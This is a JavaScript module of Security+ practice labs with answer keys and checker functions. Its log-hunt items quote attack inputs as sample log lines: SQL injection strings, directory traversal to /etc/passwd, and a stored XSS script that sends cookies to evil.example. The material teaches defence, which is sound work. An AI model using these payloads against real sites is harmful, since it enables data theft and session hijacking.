// Hands-on labs in the style of Security+ performance-based questions (PBQs):
// hunt attacks in logs, build firewall rules, order processes, sort controls,
// and work the risk formulas. Content plus pure checkers, shared by the page
// and the Node tests. d = SY0-701 domain.
(function (root) {
  'use strict';

  const LABS = [
    // ---------- Log hunt ----------
    { id: 'hunt-sqli', type: 'hunt', d: 2, title: 'Product page under attack',
      task: 'A web server access log. Tap every suspicious request, then name the attack.',
      lines: [
        '203.0.113.24 "GET /index.html" 200 5120',
        '203.0.113.24 "GET /products?id=42" 200 2210',
        "198.51.100.7 \"GET /products?id=42' OR '1'='1\" 200 98123",
        '198.51.100.7 "GET /products?id=42 UNION SELECT username,password FROM users--" 500 312',
        '203.0.113.24 "GET /cart" 200 1840',
      ],
      bad: [2, 3], options: ['SQL injection', 'Cross-site scripting', 'Directory traversal', 'Brute force attack'], answer: 0,
      why: "' OR '1'='1 and UNION SELECT are SQL typed into a URL parameter. The tell is the response size jumping to 98,123 bytes: the database returned far more rows than one product. Fix: parameterized queries and input validation." },
    { id: 'hunt-brute', type: 'hunt', d: 2, title: 'Night shift on web01',
      task: 'A Linux /var/log/auth.log. Tap every line that is part of the attack, then name it.',
      lines: [
        'Nov 14 02:11:01 web01 sshd: Failed password for root from 45.83.12.9',
        'Nov 14 02:11:02 web01 sshd: Failed password for root from 45.83.12.9',
        'Nov 14 02:11:03 web01 sshd: Failed password for root from 45.83.12.9',
        'Nov 14 02:11:04 web01 sshd: Failed password for root from 45.83.12.9',
        'Nov 14 02:11:06 web01 sshd: Accepted password for root from 45.83.12.9',
        'Nov 14 08:30:12 web01 sshd: Accepted publickey for deploy from 10.0.4.15',
      ],
      bad: [0, 1, 2, 3, 4], options: ['Brute force attack', 'Credential stuffing', 'Session hijacking', 'Privilege escalation'], answer: 0,
      why: 'Rapid failures against one account from one outside IP, then a success, is a brute force that worked. The deploy login is normal: key-based, internal address, business hours. Fix: disable root SSH login, use keys or MFA, add account lockout.' },
    { id: 'hunt-spray', type: 'hunt', d: 2, title: 'VPN login storm',
      task: 'VPN authentication log. Tap the attack traffic, then name the technique.',
      lines: [
        '09:00:01 VPN auth FAIL user=alice src=185.220.101.4',
        '09:00:01 VPN auth FAIL user=bob   src=185.220.101.4',
        '09:00:02 VPN auth FAIL user=carol src=185.220.101.4',
        '09:00:02 VPN auth FAIL user=dave  src=185.220.101.4',
        '09:00:03 VPN auth FAIL user=erin  src=185.220.101.4',
        '09:14:40 VPN auth OK   user=frank src=10.20.1.33',
      ],
      bad: [0, 1, 2, 3, 4], options: ['Password spraying', 'Brute force attack', 'Credential stuffing', 'Vishing'], answer: 0,
      why: 'One attempt per user, many users, one source: password spraying. The attacker tries one common password across accounts to stay under lockout limits. Brute force hammers a single account; credential stuffing replays stolen username-password pairs.' },
    { id: 'hunt-traversal', type: 'hunt', d: 2, title: 'Download endpoint probing',
      task: 'Web log for a file download feature. Tap the malicious requests, then name the attack.',
      lines: [
        '10.1.1.50 "GET /download?file=report.pdf" 200',
        '10.1.1.50 "GET /download?file=../../../../etc/passwd" 200',
        '10.1.1.50 "GET /download?file=..%2f..%2f..%2fwindows%2fwin.ini" 404',
        '10.1.1.77 "GET /images/logo.png" 200',
      ],
      bad: [1, 2], options: ['Directory traversal', 'SQL injection', 'Cross-site scripting', 'Buffer overflow'], answer: 0,
      why: '../ climbs out of the download folder. %2f is a URL-encoded slash, used to sneak past naive filters. The 200 on /etc/passwd means it worked. Fix: allow-list file names, canonicalize paths, run the app with least privilege.' },
    { id: 'hunt-xss', type: 'hunt', d: 2, title: 'Comment section',
      task: 'Requests to a blog. Tap the malicious ones, then name the attack.',
      lines: [
        '"GET /search?q=vpn+setup" 200',
        '"POST /comments body=Great guide, thanks!" 201',
        "\"POST /comments body=<script>fetch('https://evil.example/c?'+document.cookie)</script>\" 201",
        '"GET /search?q=<img src=x onerror=alert(1)>" 200',
      ],
      bad: [2, 3], options: ['Cross-site scripting', 'SQL injection', 'Directory traversal', 'ARP spoofing'], answer: 0,
      why: 'Script tags and onerror handlers are code meant to run in other users\' browsers. The stored comment steals session cookies from every reader. Fix: output encoding, input validation, a content security policy, HttpOnly cookies.' },
    { id: 'hunt-exfil', type: 'hunt', d: 4, title: 'Strange DNS volume',
      task: 'NetFlow records from a workstation subnet. Tap the suspicious flows, then name what is happening.',
      lines: [
        'src=10.0.5.21 dst=10.0.1.10   dport=445 bytes=12,400',
        'src=10.0.5.21 dst=142.250.72.4 dport=443 bytes=88,120',
        'src=10.0.5.21 dst=91.214.124.6 dport=53  bytes=48,210,331',
        'src=10.0.5.30 dst=10.0.1.10   dport=445 bytes=9,880',
        'src=10.0.5.21 dst=91.214.124.6 dport=53  bytes=51,904,117',
      ],
      bad: [2, 4], options: ['Data exfiltration', 'DDoS', 'ARP spoofing', 'Privilege escalation'], answer: 0,
      why: 'DNS lookups are tiny, yet one PC sent about 100 MB over port 53 to a single outside host: data being smuggled out through DNS tunneling. NetFlow shows this from metadata alone. Fix: force DNS through the internal resolver and block outbound 53 from workstations.' },

    // ---------- Firewall ----------
    { id: 'fw-https', type: 'firewall', d: 3, title: 'HTTPS-only web server',
      task: 'The DMZ web server 10.0.2.10 must accept HTTPS from anyone. Plain HTTP is not allowed (the site is HTTPS only) and Telnet must be blocked everywhere. Set each rule\'s action, then run the traffic.',
      rules: [
        { src: 'ANY', dst: '10.0.2.10', proto: 'TCP', port: 443, action: 'deny' },
        { src: 'ANY', dst: 'ANY', proto: 'TCP', port: 23, action: 'allow' },
        { src: 'ANY', dst: '10.0.2.10', proto: 'TCP', port: 80, action: 'allow' },
      ],
      tests: [
        { src: '198.51.100.4', dst: '10.0.2.10', proto: 'TCP', port: 443, expect: 'allow' },
        { src: '198.51.100.4', dst: '10.0.2.10', proto: 'TCP', port: 80, expect: 'deny' },
        { src: '203.0.113.9', dst: '10.0.3.20', proto: 'TCP', port: 23, expect: 'deny' },
        { src: '203.0.113.9', dst: '10.0.2.10', proto: 'TCP', port: 22, expect: 'deny' },
      ],
      solution: { order: [0, 1, 2], actions: ['allow', 'deny', 'deny'] },
      why: 'Allow TCP 443 to the web server, deny 23 and 80. SSH on 22 is caught by the implicit deny at the bottom: anything not explicitly allowed is dropped.' },
    { id: 'fw-ssh', type: 'firewall', d: 3, title: 'Admins only on SSH',
      task: 'Admins on 10.0.9.0/24 may SSH (TCP 22) to any server. Nobody else may use SSH. Everyone may reach the web server 10.0.2.10 on 443. Rules are checked top to bottom and the first match wins: fix the order and actions.',
      rules: [
        { src: 'ANY', dst: 'ANY', proto: 'TCP', port: 22, action: 'deny' },
        { src: '10.0.9.0/24', dst: 'ANY', proto: 'TCP', port: 22, action: 'allow' },
        { src: 'ANY', dst: '10.0.2.10', proto: 'TCP', port: 443, action: 'allow' },
      ],
      tests: [
        { src: '10.0.9.15', dst: '10.0.3.5', proto: 'TCP', port: 22, expect: 'allow' },
        { src: '10.0.4.20', dst: '10.0.3.5', proto: 'TCP', port: 22, expect: 'deny' },
        { src: '203.0.113.9', dst: '10.0.2.10', proto: 'TCP', port: 443, expect: 'allow' },
        { src: '10.0.4.20', dst: '10.0.2.10', proto: 'TCP', port: 3389, expect: 'deny' },
      ],
      solution: { order: [1, 0, 2], actions: ['deny', 'allow', 'allow'] },
      why: 'First match wins, so the specific admin allow must sit above the general SSH deny. With the deny on top, the admin rule never gets a chance. Specific rules first, broad rules after, implicit deny last.' },
    { id: 'fw-dns', type: 'firewall', d: 4, title: 'Stop DNS tunneling',
      task: 'Only the internal resolver 10.0.1.53 may send DNS (UDP 53) to the internet. Workstations must use it instead, which blocks DNS tunneling. Everyone may still browse on TCP 443.',
      rules: [
        { src: 'ANY', dst: 'ANY', proto: 'UDP', port: 53, action: 'allow' },
        { src: '10.0.1.53', dst: 'ANY', proto: 'UDP', port: 53, action: 'allow' },
        { src: 'ANY', dst: 'ANY', proto: 'TCP', port: 443, action: 'allow' },
      ],
      tests: [
        { src: '10.0.1.53', dst: '8.8.8.8', proto: 'UDP', port: 53, expect: 'allow' },
        { src: '10.0.5.21', dst: '91.214.124.6', proto: 'UDP', port: 53, expect: 'deny' },
        { src: '10.0.5.21', dst: '142.250.72.4', proto: 'TCP', port: 443, expect: 'allow' },
      ],
      solution: { order: [1, 0, 2], actions: ['deny', 'allow', 'allow'] },
      why: 'Allow the resolver first, then deny UDP 53 for everyone else. An infected PC can no longer talk DNS straight to an attacker\'s server, which kills the tunnel from the Log Hunt lab.' },

    // ---------- Sequence ----------
    { id: 'ord-ir', type: 'order', d: 4, title: 'Incident response process',
      task: 'Tap the steps in the order CompTIA lists them.',
      items: ['Preparation', 'Detection', 'Analysis', 'Containment', 'Eradication', 'Recovery', 'Lessons learned'],
      why: 'Prepare before anything happens, detect and analyze, then contain (stop the spread) before eradicating (remove the cause), recover, and finish with lessons learned. Containment before eradication is the classic exam trap.' },
    { id: 'ord-volatility', type: 'order', d: 4, title: 'Order of volatility',
      task: 'You are collecting forensic evidence. Tap the sources from MOST volatile (collect first) to LEAST.',
      items: ['CPU registers and cache', 'RAM', 'Swap and temporary files', 'Hard disk', 'Backups and archived media'],
      why: 'Collect what disappears fastest first. Registers and cache change in nanoseconds; RAM is lost at power-off; swap and temp files are overwritten soon; disks persist; archives last longest.' },
    { id: 'ord-vuln', type: 'order', d: 4, title: 'Vulnerability management',
      task: 'Tap the vulnerability management steps in order.',
      items: ['Identification (scan)', 'Analysis (prioritize, e.g. CVSS)', 'Remediation (patch or compensate)', 'Validation (rescan)', 'Reporting'],
      why: 'Find it, decide how bad it is, fix it, prove the fix worked with a rescan, then report. Validation is the step people forget: a running system can still be vulnerable.' },

    // ---------- Sort ----------
    { id: 'sort-types', type: 'sort', d: 1, title: 'Control types',
      task: 'Tap a control, then tap the type it belongs to.',
      buckets: ['Preventive', 'Detective', 'Corrective', 'Deterrent', 'Compensating', 'Directive'],
      items: [
        ['Firewall rule blocking Telnet', 0], ['Locked server room door', 0], ['IDS alert on port scans', 1],
        ['Weekly audit log review', 1], ['Restoring from backup after ransomware', 2], ['"Under video surveillance" sign', 3],
        ['Extra monitoring on a server that cannot be patched', 4], ['Acceptable use policy staff must follow', 5],
      ],
      why: 'Preventive stops it, detective spots it, corrective fixes the damage, deterrent discourages, compensating stands in for a control you cannot apply, directive tells people what to do.' },
    { id: 'sort-categories', type: 'sort', d: 1, title: 'Control categories',
      task: 'Tap a control, then tap its category.',
      buckets: ['Technical', 'Managerial', 'Operational', 'Physical'],
      items: [
        ['Full-disk encryption', 0], ['Next-generation firewall', 0], ['Annual risk assessment', 1], ['Information security policy', 1],
        ['Security awareness training', 2], ['Configuration management done by admins', 2], ['Perimeter fence and bollards', 3], ['Badge reader on the data center door', 3],
      ],
      why: 'Technical is enforced by systems, managerial by policy and risk decisions, operational by people doing tasks, physical by things in the real world.' },
    { id: 'sort-zones', type: 'sort', d: 3, title: 'Place it on the network',
      task: 'Tap a system, then tap the zone where it belongs.',
      buckets: ['Screened subnet (DMZ)', 'Internal network', 'Management network'],
      items: [
        ['Public web server', 0], ['Reverse proxy', 0], ['Email gateway', 0], ['Customer database', 1],
        ['Domain controller', 1], ['File server', 1], ['Jump server', 2], ['Out-of-band admin consoles', 2],
      ],
      why: 'Anything the internet must reach goes in the screened subnet. Data and identity stay internal. Admin access is isolated on its own management network and reached through the jump server.' },
    { id: 'sort-mitigate', type: 'sort', d: 2, title: 'Match the fix',
      task: 'Tap an attack, then tap the mitigation that best stops it.',
      buckets: ['Input validation and parameterized queries', 'MFA and account lockout', 'Patch management', 'Security awareness training'],
      items: [
        ['SQL injection', 0], ['Cross-site scripting', 0], ['Brute force on a login page', 1], ['Credential stuffing', 1],
        ['Worm exploiting a known CVE', 2], ['Phishing email with a fake invoice', 3], ['Vishing call to the help desk', 3],
      ],
      why: 'Injection is fixed in code, password attacks with MFA and lockout, known vulnerabilities with patching, and social engineering with training.' },
    { id: 'sort-states', type: 'sort', d: 3, title: 'Data states',
      task: 'Tap the data, then tap its state.',
      buckets: ['At rest', 'In transit', 'In use'],
      items: [
        ['Database files on an SSD', 0], ['Backup tapes in a vault', 0], ['An HTTPS session', 1],
        ['Traffic inside a VPN tunnel', 1], ['Values in RAM being processed', 2], ['A spreadsheet open and being edited', 2],
      ],
      why: 'At rest is stored (protect with FDE, database encryption), in transit is moving (TLS, VPN), in use is being processed in memory (secure enclaves, access control).' },

    // ---------- Risk math ----------
    { id: 'calc-laptops', type: 'calc', d: 5, title: 'Laptop theft',
      task: 'The laptop fleet is worth $200,000. One theft event loses 25% of its value. You expect 2 thefts a year.',
      fields: [{ label: 'SLE ($)', answer: 50000 }, { label: 'ARO (per year)', answer: 2 }, { label: 'ALE ($)', answer: 100000 }],
      why: 'SLE = asset value x exposure factor = $200,000 x 0.25 = $50,000. ARO = 2. ALE = SLE x ARO = $100,000 a year.' },
    { id: 'calc-fire', type: 'calc', d: 5, title: 'Server room fire',
      task: 'A server is worth $80,000. A fire would destroy 60% of it. A fire is expected once every 20 years.',
      fields: [{ label: 'SLE ($)', answer: 48000 }, { label: 'ARO (per year)', answer: 0.05 }, { label: 'ALE ($)', answer: 2400 }],
      why: 'SLE = $80,000 x 0.60 = $48,000. Once every 20 years is ARO = 1/20 = 0.05. ALE = $48,000 x 0.05 = $2,400.' },
    { id: 'calc-control', type: 'calc', d: 5, title: 'Is the control worth it?',
      task: 'A risk has an ALE of $30,000. A control costs $12,000 a year and cuts the ALE to $6,000.',
      fields: [{ label: 'ALE reduction ($)', answer: 24000 }, { label: 'Yearly value after control cost ($)', answer: 12000 }],
      why: 'Reduction = $30,000 - $6,000 = $24,000. Subtract the $12,000 cost: the control is worth $12,000 a year, so buy it. If the cost were above $24,000 it would cost more than it saves.' },
  ];

  const TYPES = {
    hunt: { name: 'Log Hunt', blurb: 'Read real-looking logs, flag the attack, name it.' },
    firewall: { name: 'Firewall', blurb: 'Set rule actions and order, then run test traffic through them.' },
    order: { name: 'Sequence', blurb: 'Put processes in the right order.' },
    sort: { name: 'Sort', blurb: 'Drop each item into the right bucket.' },
    calc: { name: 'Risk Math', blurb: 'Work the SLE, ARO and ALE formulas yourself.' },
  };

  // ---------- checkers (score 0..1, ok when everything is right) ----------
  function ipMatch(rule, ip) {
    if (rule === 'ANY') return true;
    if (rule.endsWith('/24')) return ip.split('.').slice(0, 3).join('.') === rule.split('/')[0].split('.').slice(0, 3).join('.');
    return rule === ip;
  }
  // First matching rule wins; nothing matched = implicit deny (rule -1).
  function firewallEval(rules, pkt) {
    for (let i = 0; i < rules.length; i++) {
      const r = rules[i];
      if (r.proto === pkt.proto && r.port === pkt.port && ipMatch(r.src, pkt.src) && ipMatch(r.dst, pkt.dst)) return { action: r.action, rule: i };
    }
    return { action: 'deny', rule: -1 };
  }
  function checkFirewall(lab, rules) {
    const results = lab.tests.map((t) => { const r = firewallEval(rules, t); return Object.assign({ pass: r.action === t.expect }, r); });
    const n = results.filter((r) => r.pass).length;
    return { results, score: n / lab.tests.length, ok: n === lab.tests.length };
  }
  function checkHunt(lab, selected, choice) {
    const bad = new Set(lab.bad);
    const missed = lab.bad.filter((i) => !selected.has(i));
    const extra = [...selected].filter((i) => !bad.has(i));
    const linesOk = !missed.length && !extra.length;
    const attackOk = choice === lab.answer;
    return { missed, extra, linesOk, attackOk, score: (linesOk ? 0.5 : 0) + (attackOk ? 0.5 : 0), ok: linesOk && attackOk };
  }
  function checkOrder(lab, order) {
    const per = lab.items.map((_, i) => order[i] === i);
    const n = per.filter(Boolean).length;
    return { per, score: n / lab.items.length, ok: n === lab.items.length };
  }
  function checkSort(lab, placement) {
    const per = lab.items.map((it, i) => placement[i] === it[1]);
    const n = per.filter(Boolean).length;
    return { per, score: n / lab.items.length, ok: n === lab.items.length };
  }
  function parseNumber(s) {
    const t = String(s).replace(/[$,\s]/g, '').replace(/%$/, '');
    if (!t) return NaN;
    if (/^\d+\/\d+$/.test(t)) { const [a, b] = t.split('/').map(Number); return a / b; }
    return Number(t);
  }
  function checkCalc(lab, values) {
    const per = lab.fields.map((f, i) => {
      const v = parseNumber(values[i]);
      return Number.isFinite(v) && Math.abs(v - f.answer) <= Math.max(0.0001, Math.abs(f.answer) * 0.001);
    });
    const n = per.filter(Boolean).length;
    return { per, score: n / lab.fields.length, ok: n === lab.fields.length };
  }

  const api = { LABS, TYPES, ipMatch, firewallEval, checkFirewall, checkHunt, checkOrder, checkSort, checkCalc, parseNumber };
  if (typeof module === 'object' && module.exports) module.exports = api;
  else root.SecLabs = api;
})(this);
